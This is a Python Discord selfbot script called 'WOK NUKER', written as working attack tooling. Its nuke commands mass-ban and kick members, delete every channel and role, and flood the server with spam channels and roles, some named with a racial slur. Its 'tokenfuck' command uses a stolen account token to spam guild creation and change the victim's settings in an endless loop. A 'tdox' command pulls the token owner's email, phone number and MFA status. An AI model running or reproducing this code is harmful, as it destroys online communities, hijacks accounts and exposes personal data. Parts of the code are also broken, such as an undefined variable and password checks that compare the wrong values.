class NUKER():
    __version__ = 1.0
import subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
from discord.ext.commands.core import group
import requests
import random
import discord
from discord.ext.commands import bot
from requests.sessions import Request
import termcolor
import colorama
import webbrowser
import json
import string
import time
import aiohttp, dns.name, asyncio, functools, logging
import io
import locale
import sys
from datetime import timedelta
from sys import platform
from PIL import Image
from gtts import gTTS
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from discord.ext import commands
from discord.ext import tasks
from termcolor import colored
from colorama import Fore, init

start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

token = ('')
password = ('')
prefix = ('.')


WOK = commands.Bot(command_prefix=prefix, self_bot=True)
WOK.remove_command('help')

os.system('cls')
print(f'{Fore.LIGHTMAGENTA_EX}WELCOME')

os.system('cls')
print(f'{Fore.LIGHTMAGENTA_EX}TO')

os.system('cls')
print(f'{Fore.LIGHTMAGENTA_EX}WOK')

os.system('cls')
print(f'{Fore.LIGHTMAGENTA_EX}V1')

@WOK.event
async def on_connect():
    os.system('cls')
    print(f'''{Fore.LIGHTMAGENTA_EX}
 ____              ___   ____   ___    __        ___      ______     _____    __ __________ ________    
`Mb(      db      )d'  6MMMMb  `MM    d'  @      `MM\     `M`MM'     `M`MM    d'  `MMMMMMMMM `MMMMMMMb.  
 YM.     ,PM.     ,P  8P    Y8  MM   d'          MMM\     M MM       M MM   d'   MM      \  MM    `Mb  
 `Mb     d'Mb     d' 6M      Mb MM  d'           M\MM\    M MM       M MM  d'    MM         MM     MM  
  YM.   ,P YM.   ,P  MM      MM MM d'            M \MM\   M MM       M MM d'     MM    ,    MM     MM  
  `Mb   d' `Mb   d'  MM      MM MMd'             M  \MM\  M MM       M MMd'      MMMMMMM    MM    .M9  
   YM. ,P   YM. ,P   MM      MM MMYM.            M   \MM\ M MM       M MMYM.     MM    `    MMMMMMM9'  
   `Mb d'   `Mb d'   MM      MM MM YM.           M    \MM\M MM       M MM YM.    MM         MM  \M\    
    YM,P     YM,P    YM      M9 MM  YM.          M     \MMM YM       M MM  YM.   MM         MM   \M\   
    `MM'     `MM'     8b    d8  MM   YM.         M      \MM  8b     d8 MM   YM.  MM      /  MM    \M\  
     YP       YP       YMMMM9  _MM_   YM._      _M_      \M   YMMMMM9 _MM_   YM._MMMMMMMMM _MM_    \M\_
                                                                                                       
                                                                                          
                                                                                                                   
    ''')
    print(f'{Fore.LIGHTMAGENTA_EX}                          Logged in as {WOK.user.name}#{WOK.user.discriminator}')
    print(f'{Fore.LIGHTMAGENTA_EX}                          Prefix {prefix}')
    print(f'{Fore.LIGHTMAGENTA_EX}                          Whitelist Level: Premium')
    print('')
languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]


@WOK.command()   
async def help(ctx):
  
    embed = discord.Embed(title="WOK NUKER", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/781740362636984340/781956065344356433/5fc08901cdf4c732776468.gif")
    embed.add_field(name="**NUKE COMMANDS**", value="`Nuke, Nuke2, Channels,`.\n", inline=False)
    embed.add_field(name="**MASS**", value="`Mass Ban, Mass Kick, Mass roles`\n", inline=False)
    embed.add_field(name="**DELETE**", value="`Zoom`\n", inline=False)
    embed.add_field(name="**WATCH/STREAM**", value="`Streams`\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://cdn.discordapp.com/attachments/781740362636984340/781956065344356433/5fc08901cdf4c732776468.gif")
    await ctx.send(embed=embed)
@WOK.command()
async def nuke2(ctx):
    await ctx.message.delete()
    print(f"{Fore.LIGHTMAGENTA_EX}Nuking the server")
    for users in ctx.guild.members:
        try:
            await users.ban()
            print(f"{Fore.LIGHTMAGENTA_EX}Banned")
        except:
            print(f"{Fore.LIGHTMAGENTA_EX}Failed To Ban")
            print(f"{Fore.LIGHTMAGENTA_EX}WOK ")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.LIGHTMAGENTA_EX}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'WOK WIZZED YOU{i}')
            await ctx.guild.create_voice_channel(name=f'discord.gg/wok{i}')
            await ctx.guild.create_category(name=f'WOKED OUT NIGGA{i}')
            print(f"{Fore.LIGHTMAGENTA_EX}Added {channel.name}")
  
@WOK.command()
async def b(ctx):
    await ctx.message.delete()
    await ctx.send("`WOK`")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/781740362636984340/781956065344356433/5fc08901cdf4c732776468.gif')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")

@WOK.command()
async def k(ctx):
    await ctx.message.delete()
    await ctx.send("`WOK `")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://cdn.discordapp.com/attachments/781740362636984340/781956065344356433/5fc08901cdf4c732776468.gif')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been kicked from {ctx.guild.name}")


@WOK.command()
async def channels(ctx):
  await ctx.message.delete()
  print(f"{Fore.LIGHTMAGENTA_EX} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.LIGHTMAGENTA_EX}Creating Channels...")
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'WOK GUIDS TO VICTORY')
    print(f"{Fore.LIGHTMAGENTA_EX}Added {channel.name}")

@WOK.command()
async def nuke(ctx):
    guild = ctx.guild
    for channel in list(ctx.guild.channels):
        try:
           await  channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass 
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
        )  
    except:
        pass                 
    for _i in range(999):
        await ctx.guild.create_role(name=f"WOK W")
        await ctx.guild.create_role(name=f"WOK W")
        await ctx.guild.create_role(name=f"WOK W")
        await ctx.guild.create_role(name=f"WOK W")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/WOK")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOk WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="WOK WAS HERE")
        await ctx.guild.create_text_channel(name="WOK HOED YOU")
        await ctx.guild.create_voice_channel(name="discord.gg/WOK")
        await ctx.guild.create_category(name="WOK WAS HERE")
        await ctx.guild.create_text_channel(name="WOK HOED YOU")
        await ctx.guild.create_voice_channel(name="discord.gg/wok")
        await ctx.guild.create_category(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")
        await ctx.guild.create_text_channel(name="WOK WAS HERE")
        await ctx.guild.create_voice_channel(name="WOK HOED YOU")
        await ctx.guild.create_category(name="discord.gg/wok")

@WOK.command()
async def zoom(ctx):
  await ctx.message.delete()
  print(f"{Fore.LIGHTMAGENTA_EX}Deleting Channels . . .")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.LIGHTMAGENTA_EX} Channels Deleted")

@WOK.command()
async def stream(ctx, *, message): 
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/WOK", 
    )
    await WOK.change_presence(activity=stream)

@WOK.command(name='groupleaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def group(ctx): 
    await ctx.message.delete()
    for channel in WOK.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()       

            
@WOK.command()
async def purge(ctx, amount: int): 
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == HUMLIATED.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass
       
@WOK.command()
async def uptime(ctx): 
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@WOK.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send('Pong!')

@WOK.command()
async def spam(ctx, amount: int, *, message): 
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@WOK.command()
async def massrole(ctx): 
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    

@WOK.command(aliases=['pfp', 'avatar'])
async def av(ctx, *, user: discord.Member = None):
    await ctx.message.delete()
    format = "gif"
    user = user or ctx.author
    if user.is_avatar_animated() != True:
        format = "png"
    avatar = user.avatar_url_as(format=format if format != "gif" else None)
    async with aiohttp.ClientSession() as session:
        async with session.get(str(avatar)) as resp:
            image = await resp.read()
    with io.BytesIO(image) as file:
        await ctx.send(file=discord.File(file, f"Avatar.{format}"))

@WOK.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': "WOK HOED YOU",
        'icon': "https://tenor.com/view/lean-drip-purp-gif-13728658",
        'name': "WOK#9999",
        'region': "india"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.LIGHTMAGENTA_EX}INVALID{Fore.LIGHTMAGENTA_EX}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.LIGHTMAGENTA_EX}INVALID{Fore.LIGHTMAGENTA_EX}{e}"+Fore.RESET)
            else:
                break   
           
@WOK.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.LIGHTMAGENTA_EX}Something is wrong ==> {Fore.LIGHTMAGENTA_EX}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@WOK.command()
async def unbanll(ctx):
    await ctx.message.delete()    
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@WOK.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member):
    await ctx.message.delete()
    if ('password') == 'WOKACCOUNT2020':
        print(f"{Fore.LIGHTMAGENTA_EX}[ERROR] {Fore.LIGHTMAGENTA_EX}Your password is wrong"+Fore.RESET)
    else:
        password = ('WOKACCOUNT2020')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await WOK.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.LIGHTMAGENTA_EX}Something is wrong ==> {Fore.LIGHTMAGENTA_EX}{e}"+Fore.RESET)

@WOK.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url):
    await ctx.message.delete()
    if ('password') == 'Cixaccountnow2020':
        print(f"{Fore.LIGHTMAGENTA_EX}There is a error with your password{Fore.LIGHTMAGENTA_EX}Your password is wrong"+Fore.RESET)
    else:
        password = ('Cixaccountnow202')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await WOK.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.LIGHTMAGENTA_EX}There is something worng{Fore.LIGHTMAGENTA_EX}{e}"+Fore.RESET)

@WOK.command(aliases=['fake'])
async def connections(ctx, _type, *, name = None):
    await ctx.message.delete()
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
		'visibility': 1
	}
    headers = {
		'Authorization': token,
        'Content-Type':'application/json', 
	}
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:            
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)


WOK.run('', bot=False)
